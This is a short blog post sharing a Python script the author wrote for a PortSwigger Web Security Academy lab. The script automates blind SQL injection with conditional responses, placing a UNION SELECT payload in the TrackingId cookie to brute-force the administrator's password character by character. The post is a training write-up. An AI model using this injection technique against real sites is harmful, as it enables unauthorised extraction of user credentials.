---
layout: post
current: post
cover: 'assets/images/websecacademy/blindsql/cover.jpeg'
navigation: True
title: "Blind SQL injection with conditional responses script"
date: 2021-01-02 00:00:00
tags: [websecurityacademy, sqli, python]
class: post-template
subclass: 'post'
author: darryn
---
![blindsql](/assets/images/websecacademy/blindsql/cover.jpeg)

### Overview

This post is to provide the script I created to automate the process of using blind SQL injection with conditional responses to brute force a password. This was completed for a lab while completing the SQL Injection topic on [WebSecurity Academy](https://portswigger.net/web-security). I can't recommend this training enough, the content is well written and the labs are great and best of all its free!

As part of the lab I completed the process 3 ways, manually using Burp repeater, using Burp intruder and finally by writing this Python script. I am still learning Python and this was a good exercise to do more Python coding and also reenforce the learning. 

### Final Script

```highlight
# 02/01/21
# blind-sql-lab.py
# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
# POC script to automate getting the administrator password using blind sql conditional responses

import requests
import string

url = "" # Insert URL here!

cookievalue = ""
password = ""

cookies = {'TrackingId':cookievalue}

characters = list(string.ascii_lowercase)
characters = characters + list(string.digits)

for i in range(1,21):
    for char in characters:
        cookievalue = "x'+UNION SELECT+'a' FROM users WHERE username='administrator' AND substring(password,{},1)='{}'--".format(i,char)
        cookies = {'TrackingId':cookievalue}
        r = requests.get(url, cookies=cookies)
        response = r.text
        if "Welcome back!" in response:
            print(char)
            password = password + char
            
print("Password is: " + password)
```

### Next Steps

The script could be a lot better, for example:

- Initial check to test the website is up
- Run a test conditional check to test for SQL injection
- Automate the process of finding the password length and pass to the range function

Thanks for reading!

============================================================

Any comments or feedback welcome! You can find me on [twitter](https://twitter.com/dazbrownfield).

<a href="https://www.buymeacoffee.com/dazbrownfield" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-blue.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>

